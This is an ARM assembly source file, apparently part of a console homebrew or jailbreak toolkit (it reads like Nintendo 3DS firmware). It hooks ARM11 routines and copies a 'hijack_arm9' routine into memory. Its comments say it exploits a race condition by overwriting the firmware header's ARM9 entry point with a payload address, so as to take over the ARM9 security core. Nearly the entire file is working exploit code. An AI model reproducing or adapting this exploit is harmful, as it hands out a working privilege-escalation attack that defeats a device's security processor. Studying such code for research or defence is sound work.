.arm
.align 4
.code 32
.text

.global	arm11_start
arm11_start:
	B               hook1
	B               hook2

hook1:
	STMFD           SP!, {R0-R12,LR}

	MOV             R0, #64
	BL              delay

	MOV             R0, #0
	BL              pxi_send

	BL              pxi_sync

	MOV             R0, #0x10000
	BL              pxi_send

	BL              pxi_recv
	BL              pxi_recv
	BL              pxi_recv

	MOV             R0, #2
	BL              pdn_send

	MOV             R0, #0
	BL              pdn_send

	LDMFD           SP!, {R0-R12,LR}

	LDR             R0, var_44836
	STR             R0, [R1]
	LDR             PC, va_hook1_ret

	var_44836:      .long 0x44836

@ copy hijack_arm9 routine and execute
hook2:
	ADR             R0, hijack_arm9
	ADR             R1, hijack_arm9_end
	LDR             R2, pa_hijack_arm9_dst
	MOV             R4, R2
	BL              copy_mem
	MOV		r0, #0
	MCR		p15, 0, r0, c7, c10, 0	@ Clean data cache
	MCR		p15, 0, r0, c7, c10, 4	@ Drain write buffer
	MCR		p15, 0, r0, c7, c5, 0	@ Flush instruction cache
	BX              R4

@ exploits a race condition in order
@ to take control over the arm9 core
hijack_arm9:
	@ init
	LDR             R0, pa_arm11_code
	MOV             R1, #0
	STR             R1, [R0]

	@ load physical addresses
	LDR             R10, pa_firm_header
	LDR             R9, pa_arm9_payload
	LDR             R8, pa_io_mem

	@ send pxi cmd 0x44846
	LDR             R1, pa_pxi_regs
	LDR             R2, some_pxi_cmd
	STR             R2, [R1, #8]

wait_arm9_loop:
	LDRB            R0, [R8]
	ANDS            R0, R0, #1
	BNE	            wait_arm9_loop

	@ overwrite orig entry point with FCRAM addr
	@ this exploits the race condition bug
	STR             R9, [R10, #0x0C]

	LDR             R0, pa_arm11_code
wait_arm11_loop:
	LDR	            R1, [r0]
	CMP             R1, #0
	BEQ             wait_arm11_loop
	BX              R1

	pa_hijack_arm9_dst:  .long 0x1FFFFC00
	pa_arm11_code:       .long 0x1FFFFFF8
	pa_pxi_regs:         .long 0x10163000
	some_pxi_cmd:        .long 0x44846
	pa_firm_header:      .long 0x24000000
	pa_arm9_payload:     .long 0x23F00000
	pa_io_mem:           .long 0x10140000
hijack_arm9_end:

copy_mem:
	SUB             R3, R1, R0
	MOV             R1, R3,ASR#2
	CMP             R1, #0
	BLE             locret_FFFF0AC0
	MOVS            R1, R3,LSL#29
	SUB             R0, R0, #4
	SUB             R1, R2, #4
	BPL             loc_FFFF0AA0
	LDR             R2, [R0,#4]!
	STR             R2, [R1,#4]!
loc_FFFF0AA0:
	MOVS            R2, R3,ASR#3
	BEQ             locret_FFFF0AC0
loc_FFFF0AA8:
	LDR             R3, [R0,#4]
	SUBS            R2, R2, #1
	STR             R3, [R1,#4]
	LDR             R3, [R0,#8]!
	STR             R3, [R1,#8]!
	BNE             loc_FFFF0AA8
locret_FFFF0AC0:
	BX              LR

pdn_send:
	LDR             R1, va_pdn_regs
	STRB            R0, [R1, #0x230]
	BX              LR

pxi_send:
	LDR             R1, va_pxi_regs
loc_1020D0:
	LDRH            R2, [R1,#4]
	TST             R2, #2
	BNE             loc_1020D0
	STR             R0, [R1,#8]

	MOV             R0, #4
delay:
	MOV             R1, #0
        MCR             p15, 0, r1, c7, c10, 0
	MCR             p15, 0, r1, c7, c10, 4
loop:
	SUBS            R0, #1
	BGT             loop
	BX              LR

pxi_recv:
	LDR             R0, va_pxi_regs
loc_1020FC:
	LDRH            R1, [R0,#4]
	TST             R1, #0x100
	BNE             loc_1020FC
	LDR             R0, [R0,#0xC]
	BX              LR

pxi_sync:
	LDR             R0, va_pxi_regs
	LDRB            R1, [R0,#3]
	ORR             R1, R1, #0x40
	STRB            R1, [R0,#3]
	BX              LR

.global arm11_end
arm11_end:

.global arm11_globals_start
arm11_globals_start:

	va_pdn_regs:    .long 0
	va_pxi_regs:    .long 0
	va_hook1_ret:   .long 0

.global arm11_globals_end
arm11_globals_end:
